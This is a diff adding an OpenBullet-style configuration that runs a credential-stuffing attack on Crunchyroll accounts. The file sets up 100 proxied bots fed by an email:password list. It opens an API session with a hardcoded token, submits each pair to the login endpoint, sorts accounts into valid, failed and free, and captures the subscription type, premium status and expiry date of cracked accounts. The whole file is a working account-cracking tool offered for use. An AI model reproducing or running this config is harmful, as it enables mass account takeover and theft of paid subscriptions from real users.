@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "CrunchyRoll  latest",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-04T10:48:09.0177544-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GUID FUNCTION GenerateGUID -> VAR "1" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h-?h?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "G" 
+
+REQUEST POST "https://api.crunchyroll.com/start_session.0.json" 
+  CONTENT "device_type=com.crunchyroll.windows.desktop&device_id=<G>&access_token=LNDJgOit5yaRIWN" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "session_id" -> VAR "ID" 
+
+REQUEST POST "https://api.crunchyroll.com/login.0.json" 
+  CONTENT "account=<USER>&password=<PASS>&session_id=<ID>&locale=enUS&version=1.3.1.0&connectivity_type=ethernet" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"access_type\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect login information" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"access_type\":null" 
+
+PARSE "<SOURCE>" JSON "access_type" -> CAP "Type" 
+
+PARSE "<SOURCE>" JSON "premium" -> CAP "Category" 
+
+PARSE "<SOURCE>" JSON "expires" -> CAP "ExpireDate" 
+
